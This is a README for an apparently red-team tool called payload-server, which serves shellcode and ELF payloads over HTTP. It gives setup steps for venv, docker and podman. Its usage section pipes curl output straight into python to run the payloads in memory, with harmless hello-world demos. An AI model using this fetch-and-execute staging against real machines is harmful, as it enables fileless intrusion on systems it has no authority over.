# payload-server

Serve your payloads over http

## Getting started

### Development setup

Setup the venv and install requirements.

```sh
python -m venv ./venv
. ./venv/bin/activate
```

### Run the server from venv

Add some payloads to the `shellcode` and `elf` directories. Start the server.

```sh
gunicorn --bind 127.0.0.1:5000 payload-server:app
```

### Run the server with docker

Run this to build the docker container and start the server.

```sh
docker-compose up --build
```

### Run the server with podman

```sh
podman build --tag localhost/payload-server:latest .
podman run -dt -p 5000:5000 --volume $PWD/templates/:/app/templates:ro --volume $PWD/elf:/app/elf:ro --volume $PWD/shellcode:/app/shellcode:ro --volume $PWD/python:/app/python:ro localhost/payload-server:latest
```

#### Run with podman kube file

Update the `payload-server_kube.yml` file with the full path to your volume directories. Then run the following to run the pod.

```sh
podman play kube payload-server_kube.yml
```

### Use the payloads

Pull down a payload with `curl` and execute it on a machine. They should work with both python2 and python3.

```sh
$ curl -s localhost:5000/sc/hello | python3
Hello, World!

$ curl -s localhost:5000/elf/hello | python3
Hello World
$ curl -s localhost:5000/sc/hello | python2
Hello, World!

$ curl -s localhost:5000/elf/hello | python2
Hello World
```

## Resources

* [Execute shellcode using ctypes](https://github.com/thomaskeck/PyShellCode)
* [In-memory ELF execution](https://github.com/nnsee/fileless-elf-exec)
